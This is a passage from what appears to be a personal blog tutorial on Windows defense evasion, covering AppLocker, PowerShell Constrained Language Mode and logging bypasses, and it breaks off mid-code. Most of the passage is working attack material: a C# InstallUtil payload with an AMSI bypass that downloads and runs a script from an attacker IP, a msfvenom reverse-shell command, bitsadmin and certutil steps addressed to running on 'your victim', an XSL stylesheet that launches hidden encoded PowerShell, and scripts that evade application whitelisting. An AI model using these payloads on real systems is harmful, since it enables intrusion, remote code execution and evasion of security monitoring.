href=\"https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html\">tiraniddo</a> here found a way to disable the AppLocker with the TrustedInstaller account :</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"built_in\">New-ScheduledTaskAction</span> <span class=\"literal\">-Execute</span> cmd.exe <span class=\"literal\">-Argument</span> <span class=\"string\">&quot;/C sc.exe config appidsvc start= demand &amp;&amp; sc.exe stop appidsvc&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Register-ScheduledTask</span> <span class=\"literal\">-TaskName</span> <span class=\"string\">&#x27;TestTask&#x27;</span> <span class=\"literal\">-TaskPath</span> \\ <span class=\"literal\">-Action</span> <span class=\"variable\">$a</span></span><br><span class=\"line\"><span class=\"variable\">$svc</span> = <span class=\"built_in\">New-Object</span> <span class=\"literal\">-ComObject</span> <span class=\"string\">&#x27;Schedule.Service&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$svc</span>.Connect()</span><br><span class=\"line\"><span class=\"variable\">$user</span> = <span class=\"string\">&#x27;NT SERVICE\\TrustedInstaller&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$folder</span> = <span class=\"variable\">$svc</span>.GetFolder(<span class=\"string\">&#x27;\\&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable\">$task</span> = <span class=\"variable\">$folder</span>.GetTask(<span class=\"string\">&#x27;TestTask&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable\">$task</span>.RunEx(<span class=\"variable\">$null</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"variable\">$user</span>)</span><br></pre></td></tr></table></figure><p>{: .prompt-tip }</p>\n</blockquote>\n<h3 id=\"Path-Hash-restrictions-bypass\"><a href=\"#Path-Hash-restrictions-bypass\" class=\"headerlink\" title=\"Path &#x2F; Hash restrictions bypass\"></a>Path &#x2F; Hash restrictions bypass</h3><p>In this scenario, i will show you how we can bypass the Path &#x2F; Hash restrictions by moving the file to an allowed executable path and changing the file wish to lead to changing the whole hash</p>\n<p>First we will see what directories that our permession to the subdirectories of the main dir that we can run exe files from it</p>\n<p>Then we will edit the file hash , Seems this will make will work</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">Get-ChildItem</span> C:\\Windows\\ <span class=\"literal\">-Directory</span> <span class=\"literal\">-Recurse</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue | <span class=\"built_in\">ForEach-Object</span> &#123; <span class=\"variable\">$dir</span> = <span class=\"variable\">$_</span>; <span class=\"keyword\">try</span> &#123; (<span class=\"built_in\">Get-Acl</span> <span class=\"variable\">$dir</span>.FullName <span class=\"literal\">-ErrorAction</span> SilentlyContinue).Access | <span class=\"built_in\">Where-Object</span> &#123; <span class=\"variable\">$_</span>.AccessControlType <span class=\"operator\">-eq</span> <span class=\"string\">&quot;Allow&quot;</span> <span class=\"operator\">-and</span> (<span class=\"variable\">$_</span>.IdentityReference.Value <span class=\"operator\">-eq</span> <span class=\"string\">&quot;NT AUTHORITY\\Authenticated Users&quot;</span> <span class=\"operator\">-or</span> <span class=\"variable\">$_</span>.IdentityReference.Value <span class=\"operator\">-eq</span> <span class=\"string\">&quot;BUILTIN\\Users&quot;</span>) <span class=\"operator\">-and</span> ((<span class=\"variable\">$_</span>.FileSystemRights <span class=\"operator\">-like</span> <span class=\"string\">&quot;*Write*&quot;</span> <span class=\"operator\">-or</span> <span class=\"variable\">$_</span>.FileSystemRights <span class=\"operator\">-like</span> <span class=\"string\">&quot;*Create*&quot;</span>) <span class=\"operator\">-and</span> <span class=\"variable\">$_</span>.FileSystemRights <span class=\"operator\">-like</span> <span class=\"string\">&quot;*Execute*&quot;</span>) &#125; | <span class=\"built_in\">ForEach-Object</span> &#123; <span class=\"built_in\">Write-Host</span> (<span class=\"variable\">$dir</span>.FullName + <span class=\"string\">&quot;: &quot;</span> + <span class=\"variable\">$_</span>.IdentityReference.Value + <span class=\"string\">&quot; (&quot;</span> + <span class=\"variable\">$_</span>.FileSystemRights + <span class=\"string\">&quot;)&quot;</span>) &#125; &#125; <span class=\"keyword\">catch</span> &#123;&#125; &#125;</span><br><span class=\"line\">C:\\Windows\\Tasks: NT AUTHORITY\\Authenticated Users (CreateFiles, ReadAndExecute, Synchronize)</span><br><span class=\"line\">C:\\Windows\\tracing: BUILTIN\\Users (<span class=\"built_in\">Write</span>, ReadAndExecute, Synchronize)</span><br><span class=\"line\">C:\\Windows\\System32\\spool\\drivers\\color: BUILTIN\\Users (CreateFiles, ReadAndExecute, Synchronize)</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">cp</span> .\\Downloads\\nc64.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; &amp; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\">Program <span class=\"string\">&#x27;nc64.exe&#x27;</span> failed to run: This program is blocked by <span class=\"built_in\">group</span> policy. <span class=\"keyword\">For</span> more information, contact your system</span><br><span class=\"line\">administratorAt line:<span class=\"number\">1</span> char:<span class=\"number\">1</span></span><br><span class=\"line\">+ &amp; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.</span><br><span class=\"line\">At line:<span class=\"number\">1</span> char:<span class=\"number\">1</span></span><br><span class=\"line\">+ &amp; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class=\"line\">    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException</span><br><span class=\"line\">    + FullyQualifiedErrorId : NativeCommandFailed</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;N1NJ10&quot;</span> &gt;&gt; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; &amp; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe <span class=\"literal\">-l</span> <span class=\"literal\">-p</span> <span class=\"number\">7777</span></span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def20.png\" alt=\"\"></figure>\n\n\n<h3 id=\"InstallUtil-Shell-Updated-Part\"><a href=\"#InstallUtil-Shell-Updated-Part\" class=\"headerlink\" title=\"InstallUtil - Shell ( Updated Part )\"></a>InstallUtil - Shell ( Updated Part )</h3><p>There is a bypass technique that usess the <a href=\"https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool\">Installutil</a> , My first time to see it from <a href=\"https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/\">pentestlab</a> i reccomed u to read this before contiue</p>\n<p>As we know now , when can use installutil to run an exe files inside them to bypass the applocker rules ( Since this utility is a <span style=\"color:yellow\">Microsoft signed binary</span> then it could be used to run any .NET executables bypassing in that way AppLocker restrictions. Also this utility is <span style=\"color:yellow\">located inside the Windows directory</span> which AppLocker policies are not going to be applied as the contents of the Windows folder are needed to be executed in order for the system to run normally ) and bypass the CLM lang ( InstallUtil <span style=\"color:yellow\">executes the code in a .NET context, not PowerShell, avoiding CLM restrictions</span>. ) , okey let‚Äôs see how we can exploit this using this code</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation.Runspaces;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Configuration.Install;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace BypassCLM</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">static</span> void Main(string[] args)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Console.WriteLine(<span class=\"string\">&quot;This is vairous , ru kidding !!!! &quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    [<span class=\"type\">System.ComponentModel.RunInstaller</span>(<span class=\"type\">true</span>)]</span><br><span class=\"line\">    public <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sample</span> : <span class=\"title\">System</span>.<span class=\"title\">Configuration</span>.<span class=\"title\">Install</span>.<span class=\"title\">Installer</span></span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        public override void Uninstall(System.Collections.IDictionary savedState)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">           string amsiBypass = <span class=\"string\">@&quot;[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;).GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)&quot;;</span></span><br><span class=\"line\"><span class=\"string\">           string cmd = &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.99.21:8080/a9kMET&#x27;)&quot;;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">           Runspace rs = RunspaceFactory.CreateRunspace();</span></span><br><span class=\"line\"><span class=\"string\">           rs.Open();</span></span><br><span class=\"line\"><span class=\"string\">           PowerShell ps = PowerShell.Create();</span></span><br><span class=\"line\"><span class=\"string\">           ps.Runspace = rs;</span></span><br><span class=\"line\"><span class=\"string\">           ps.AddScript(amsiBypass); // First, bypass AMSI</span></span><br><span class=\"line\"><span class=\"string\">           ps.Invoke();</span></span><br><span class=\"line\"><span class=\"string\">           ps.AddScript(cmd); // Then, execute the downloaded script</span></span><br><span class=\"line\"><span class=\"string\">           ps.Invoke();</span></span><br><span class=\"line\"><span class=\"string\">           rs.Close();</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>Create ur reverse shell and change the cmd variable ( u can do it with metasploit or any other c2 ) and the amsiBypass also , Then compile it with the .Net <a href=\"https://dotnet.microsoft.com/en-us/download/dotnet-framework\">csc.exe</a> binary</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.<span class=\"number\">0.30319</span>\\csc.exe /reference:<span class=\"string\">&quot;C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll&quot;</span> /out:Bypass.exe BypassCLM.cs</span><br><span class=\"line\">certutil <span class=\"literal\">-encode</span> Bypass.exe bypass.txt</span><br></pre></td></tr></table></figure>\n\n<p>Then run your <a href=\"https://github.com/danvk/RangeHTTPServer\">RangeHTTPServer</a> ( <strong>Not http</strong> )</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m RangeHTTPServer 1234</span><br></pre></td></tr></table></figure>\n\n<p>Then go to your victum and excute those commands</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bitsadmin /transfer Bad_Work http://<span class=\"number\">192.168</span>.<span class=\"number\">99.21</span>/bypass.txt C:\\Windows\\System32\\spool\\drivers\\color\\bypass.txt</span><br><span class=\"line\">certutil <span class=\"literal\">-decode</span> C:\\Windows\\System32\\spool\\drivers\\color\\bypass.txt C:\\Windows\\System32\\spool\\drivers\\color\\bypass.exe</span><br><span class=\"line\">&amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.<span class=\"number\">0.30319</span>\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\System32\\spool\\drivers\\color\\bypass.exe</span><br></pre></td></tr></table></figure>\n\n<p>If you follow those steps you should get the shell</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def21.png\" alt=\"\"></figure>\n\n\n<h3 id=\"WMIC-Updated-Part\"><a href=\"#WMIC-Updated-Part\" class=\"headerlink\" title=\"WMIC ( Updated Part )\"></a>WMIC ( Updated Part )</h3><p>There is a small trick when u can use a wmic to bypass this restrictions , I try this one on a ctf on hackthebox you can use this xsl file ( Change the reverse shell ) :</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&#x27;1.0&#x27;</span>?&gt;</span><br><span class=\"line\">&lt;stylesheet version=<span class=\"string\">&quot;1.0&quot;</span></span><br><span class=\"line\">xmlns=<span class=\"string\">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class=\"line\">xmlns:ms=<span class=\"string\">&quot;urn:schemas-microsoft-com:xslt&quot;</span></span><br><span class=\"line\">xmlns:user=<span class=\"string\">&quot;http://mycompany.com/mynamespace&quot;</span>&gt;</span><br><span class=\"line\">&lt;output method=<span class=\"string\">&quot;text&quot;</span>/&gt;</span><br><span class=\"line\">        &lt;ms:script implements<span class=\"literal\">-prefix</span>=<span class=\"string\">&quot;user&quot;</span> language=<span class=\"string\">&quot;JScript&quot;</span>&gt;</span><br><span class=\"line\">                &lt;![<span class=\"type\">CDATA</span>[</span><br><span class=\"line\">                        <span class=\"type\">var</span> <span class=\"type\">r</span> = <span class=\"type\">new</span> <span class=\"type\">ActiveXObject</span>(<span class=\"string\">&quot;WScript.Shell&quot;</span>);</span><br><span class=\"line\">                        <span class=\"type\">r.Run</span>(<span class=\"string\">&quot;powershell.exe -nop -w hidden -e xxxxxxxxxxxxxxxxxx=&quot;</span>);</span><br><span class=\"line\">                ]]&gt;</span><br><span class=\"line\">        &lt;/ms:script&gt;</span><br><span class=\"line\">&lt;/stylesheet&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Then you can get the file from the server or download and excute it</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">wmic <span class=\"keyword\">process</span> get brief /format:<span class=\"string\">&quot;rev.xsl&quot;</span></span><br><span class=\"line\">wmic <span class=\"keyword\">process</span> get brief /format:<span class=\"string\">&quot;http://192.168.99.21:1234/rev.xsl&quot;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>There is more ways you can test from here :</p>\n<ul>\n<li><a href=\"https://ppn.snovvcra.sh/pentest/infrastructure/ad/av-edr-evasion/applocker-bypass\">snovvcra.sh</a></li>\n<li><a href=\"https://itm4n.github.io/reinventing-powershell/#constrained-language-mode-clm\">itm4n</a></li>\n<li><a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList\">UltimateAppLockerByPassList</a><br>{: .prompt-tip }</li>\n</ul>\n</blockquote>\n<h3 id=\"Alternate-Data-Stream\"><a href=\"#Alternate-Data-Stream\" class=\"headerlink\" title=\"Alternate Data Stream\"></a>Alternate Data Stream</h3><p><a href=\"https://owasp.org/www-community/attacks/Windows_alternate_data_stream\">OWASP</a> said The NTFS file system includes support for alternate data streams. This is not a well known feature and was included, primarily, to provide compatibility with files in the Macintosh file system. Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called <code>:$DATA</code></p>\n<p>So we can hide a data stream in any file without the user even konw !!</p>\n<p>So let‚Äôs first create our reverse shell</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.21 LPORT=7771 -a x64 --platform Windows -f exe -o rev_shell.exe</span><br></pre></td></tr></table></figure>\n\n<p>Then transfer the file to the victum machine and embaded it into another file ( <strong>Run this from the cmd</strong> )</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">type</span> C:\\Users\\matio\\Desktop\\rev_shell.exe &gt; <span class=\"string\">&quot;C:\\Users\\matio\\Desktop\\test.txt -Stream rev_shell.exe&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">wmic <span class=\"keyword\">process</span> call create <span class=\"string\">&#x27;&quot;test.txt:rev_shell.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>Then it should be worked.</p>\n<h2 id=\"Powershell-CLM-Bypass\"><a href=\"#Powershell-CLM-Bypass\" class=\"headerlink\" title=\"Powershell CLM Bypass\"></a>Powershell CLM Bypass</h2><p>Let‚Äôs see if we can bypass the CLM , First let‚Äôs see the LanguageMode we are using</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def22.png\" alt=\"\"></figure>\n\n<p>There is more than a way to Bypass the CLM</p>\n<h3 id=\"PowerShdll\"><a href=\"#PowerShdll\" class=\"headerlink\" title=\"PowerShdll\"></a>PowerShdll</h3><p>we can Run PowerShell with rundll32. Bypass software restrictions using <a href=\"https://github.com/p3nt4/PowerShdll\">PowerShdll</a>, so Let‚Äôs see</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bitsadmin /transfer Bad_Work http://<span class=\"number\">192.168</span>.<span class=\"number\">99.21</span>:<span class=\"number\">1234</span>/PowerShdll_x64.dll C:\\Windows\\System32\\spool\\drivers\\color\\PowerShdll_x64.dl</span><br><span class=\"line\">rundll32.exe PowerShdll_x64.dll,main <span class=\"literal\">-w</span></span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def23.png\" alt=\"\"></figure>\n\n<blockquote>\n<p>You can try some other tools like <a href=\"https://github.com/padovah4ck/PSByPassCLM\">PSByPassCLM</a> or <a href=\"https://github.com/calebstewart/bypass-clm\">bypass-clm</a><br>{: .prompt-tip }</p>\n</blockquote>\n<h3 id=\"TEMP-ORARY-Updated-Part\"><a href=\"#TEMP-ORARY-Updated-Part\" class=\"headerlink\" title=\"%TEMP%ORARY ( Updated Part )\"></a>%TEMP%ORARY ( Updated Part )</h3><p>One of the catchy methods to bypass the CLM language in powershell is this method</p>\n<p>Remmeber in the beggening of talking about the CLM i leave you with an important note by Rudy Ooms [ When PowerShell starts, it checks whether <a href=\"https://call4cloud.nl/deploying-applocker-intune-powershell/\"><strong>AppLocker Script Enforcement</strong></a> Rules are present. It does this by simulating the execution of a test <strong>PowerShell script placed in the user‚Äôs temporary</strong> folder and evaluating it against the system‚Äôs policies. ] so why this important ?</p>\n<p>By focus on this statment we should understand that , when a user open the powershell for the first time the system made a random powershell script in his temp dir ( Which are not in the dirs that can execute any binaries or powershell scripts ) and see if this user can execute this script or not</p>\n<p>If yes okey make him in the FullLanguage mode if not change the language mode to ConstrainedLanguage , Okey what if we change the user temp dir in the enviroment to path that we have access and this path in the dirs that applocker permit them to run the executables and scripts from ( Like we do in the applocker bypass ) and start a new powershell session with those new env variables ?</p>\n<p>This was <a href=\"http://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/\">Oddvar</a> idea so he make this script , let‚Äôs test it and see if this sucess or not</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$CurrTemp</span> = <span class=\"variable\">$env:temp</span></span><br><span class=\"line\"><span class=\"variable\">$CurrTmp</span> = <span class=\"variable\">$env:tmp</span></span><br><span class=\"line\"><span class=\"variable\">$TEMPBypassPath</span> = <span class=\"string\">&quot;C:\\windows\\temp&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$TMPBypassPath</span> = <span class=\"string\">&quot;C:\\windows\\temp&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&#x27;hkcu:\\Environment&#x27;</span> <span class=\"literal\">-Name</span> Tmp <span class=\"literal\">-Value</span> <span class=\"string\">&quot;<span class=\"variable\">$TEMPBypassPath</span>&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&#x27;hkcu:\\Environment&#x27;</span> <span class=\"literal\">-Name</span> Temp <span class=\"literal\">-Value</span> <span class=\"string\">&quot;<span class=\"variable\">$TMPBypassPath</span>&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Invoke-WmiMethod</span> <span class=\"literal\">-Class</span> win32_process <span class=\"literal\">-Name</span> create <span class=\"literal\">-ArgumentList</span> <span class=\"string\">&quot;powershell&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">sleep</span> <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Set it back</span></span><br><span class=\"line\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&#x27;hkcu:\\Environment&#x27;</span> <span class=\"literal\">-Name</span> Tmp <span class=\"literal\">-Value</span> <span class=\"variable\">$CurrTmp</span></span><br><span class=\"line\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&#x27;hkcu:\\Environment&#x27;</span> <span class=\"literal\">-Name</span> Temp <span class=\"literal\">-Value</span> <span class=\"variable\">$CurrTemp</span></span><br><span class=\"line\"></span><br><span class=\"line\">OR the Cool one by Matt Graeber Note -&gt; https://posts.specterops.io/bypassing<span class=\"literal\">-application-whitelisting-with-runscripthelper-exe-1906923658fc</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Path to Powershell</span></span><br><span class=\"line\"><span class=\"variable\">$CMDLine</span> = <span class=\"string\">&quot;<span class=\"variable\">$PSHOME</span>\\powershell.exe&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Getting existing env vars</span></span><br><span class=\"line\">[<span class=\"built_in\">String</span>[]] <span class=\"variable\">$EnvVarsExceptTemp</span> = <span class=\"built_in\">Get-ChildItem</span> Env:\\* <span class=\"literal\">-Exclude</span> <span class=\"string\">&quot;TEMP&quot;</span>,<span class=\"string\">&quot;TMP&quot;</span>| % &#123; <span class=\"string\">&quot;<span class=\"variable\">$</span>(<span class=\"variable\">$_</span>.Name)=<span class=\"variable\">$</span>(<span class=\"variable\">$_</span>.Value)&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Custom TEMP and TMP</span></span><br><span class=\"line\"><span class=\"variable\">$TEMPBypassPath</span> = <span class=\"string\">&quot;Temp=C:\\windows\\temp&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$TMPBypassPath</span> = <span class=\"string\">&quot;TMP=C:\\windows\\temp&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Add the to the list of vars</span></span><br><span class=\"line\"><span class=\"variable\">$EnvVarsExceptTemp</span> += <span class=\"variable\">$TEMPBypassPath</span></span><br><span class=\"line\"><span class=\"variable\">$EnvVarsExceptTemp</span> += <span class=\"variable\">$TMPBypassPath</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Define the start params</span></span><br><span class=\"line\"><span class=\"variable\">$StartParamProperties</span> = <span class=\"selector-tag\">@</span>&#123; EnvironmentVariables = <span class=\"variable\">$EnvVarsExceptTemp</span> &#125;</span><br><span class=\"line\"><span class=\"variable\">$StartParams</span> = <span class=\"built_in\">New-CimInstance</span> <span class=\"literal\">-ClassName</span> Win32_ProcessStartup <span class=\"literal\">-ClientOnly</span> <span class=\"literal\">-Property</span> <span class=\"variable\">$StartParamProperties</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Start a new powershell using the new params</span></span><br><span class=\"line\"><span class=\"built_in\">Invoke-CimMethod</span> <span class=\"literal\">-ClassName</span> Win32_Process <span class=\"literal\">-MethodName</span> Create <span class=\"literal\">-Arguments</span> <span class=\"selector-tag\">@</span>&#123;</span><br><span class=\"line\">CommandLine = <span class=\"variable\">$CMDLine</span></span><br><span class=\"line\">ProcessStartupInformation = <span class=\"variable\">$StartParams</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def24.png\" alt=\"\"></figure>\n\n<h2 id=\"PowerShell-Logging\"><a href=\"#PowerShell-Logging\" class=\"headerlink\" title=\"PowerShell Logging\"></a>PowerShell Logging</h2><p>PowerShell logging is the process of recording activities within PowerShell sessions, such as commands executed, scripts run, and their outputs or execution details. It is designed to support auditing, debugging, and security monitoring in Windows environments. The three primary logging types : </p>\n<ul>\n<li>Transcription</li>\n<li>Script Block Logging</li>\n<li>Module Logging</li>\n</ul>\n<p>Each serves distinct purposes, capturing different levels of detail about PowerShell activities, so let us talk about them and their bypasses and how to configure them.</p>\n<h3 id=\"PowerShell-Transcription\"><a href=\"#PowerShell-Transcription\" class=\"headerlink\" title=\"PowerShell Transcription\"></a>PowerShell Transcription</h3><p>The Transcription loging records both input (commands typed) and output (responses shown) of PowerShell sessions, like a session transcript.</p>\n<p>Let‚Äôs configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to PowerShell Transcription</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def25.png\" alt=\"\"></figure>\n\n<p>Let‚Äôs see how this work , you can run this script to know the Transcription are on or not</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$transcriptionSettings</span> = <span class=\"built_in\">Get-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription&quot;</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$transcriptionSettings</span> <span class=\"operator\">-and</span> <span class=\"variable\">$transcriptionSettings</span>.EnableTranscripting <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Transcription logging is enabled.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$transcriptionSettings</span>.OutputDirectory) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Log directory: <span class=\"variable\">$</span>(<span class=\"variable\">$transcriptionSettings</span>.OutputDirectory)&quot;</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Log directory: Default (User&#x27;s Documents folder, typically <span class=\"variable\">$HOME</span>\\Documents)&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$transcriptionSettings</span>.EnableInvocationHeader <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Invocation headers are included in logs.&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Transcription logging is not enabled via Group Policy.&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs see what this will do</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def26.png\" alt=\"\"></figure>\n\n\n<p>you can‚Äôt get the script content here you just get the command and the ouput like a session</p>\n<blockquote>\n<p>what is the invokation headers , <a href=\"https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/\">Patrick</a> explain them here with those screenshots :</p>\n<p>Transcription Logging without invokation headers activated:</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def27.png\" alt=\"\"></figure>\nThe second one shows logging with invokation headers activated:\n<figure><img src=\"/images/site/posts/DefenseEvasion/def28.png\" alt=\"\"></figure><p>{: .prompt-info }</p>\n</blockquote>\n<h4 id=\"PowerShell-Transcription-Bypass\"><a href=\"#PowerShell-Transcription-Bypass\" class=\"headerlink\" title=\"PowerShell Transcription Bypass\"></a>PowerShell Transcription Bypass</h4><p>This one Doesn‚Äôt have many resources but there is a one <a href=\"https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass\">here</a> by <a href=\"https://avantguard.io/en/blog/author/jann-lemm\">jann lemm</a> , The idea behinde this bypass is the Transcription only check one thing to determine if it‚Äôs enabled and it‚Äôs the PowerShell registry (<strong>HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription)</strong> or Group Policy to check if <strong>EnableTranscripting is 1</strong></p>\n<p>To change the key we need an administrative privileges so what should we do ?</p>\n<p>jann lemm said , If the registry key EnableTranscripting is set to 0 while in an active PowerShell session, the transcript is continued and no bypass is possible, even though the cached value is set to 0. But if these changes to the field are made before a custom PowerShell runspace is opened, the runspace will use the cached (and modified) values, effectively allowing a bypass of the three logging mechanisms by an unprivileged user.</p>\n<p>For the first time i don‚Äôt understand it , So i will try to explain this more for you in Practical way like the above</p>\n<p>So Let‚Äôs see how the jann lemm bypass work and how the regular exe work to work Hello World</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Hello_World.cs </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation;</span><br><span class=\"line\"><span 